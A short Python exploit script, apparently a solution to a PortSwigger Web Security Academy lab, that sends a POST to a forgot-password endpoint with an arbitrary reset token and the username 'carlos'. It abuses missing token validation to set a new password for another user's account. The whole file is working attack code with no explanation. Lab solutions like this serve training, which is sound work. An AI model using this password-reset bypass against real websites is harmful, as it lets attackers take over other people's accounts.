import requests

TARGET = 'https://ac2c1ff01f086dffc0f87aff00e00034.web-security-academy.net/forgot-password'

PAYLOAD = {
    'temp-forgot-password-token': 'any_token',
    'username': 'carlos',
    'new-password-1': 'peter',
    'new-password-2': 'peter'
}

RESPONCE_OK = 200

r = requests.post(TARGET, data = PAYLOAD)

if r.status_code == RESPONCE_OK:
    print('POST request sent')
else:
    print(r.status_code)
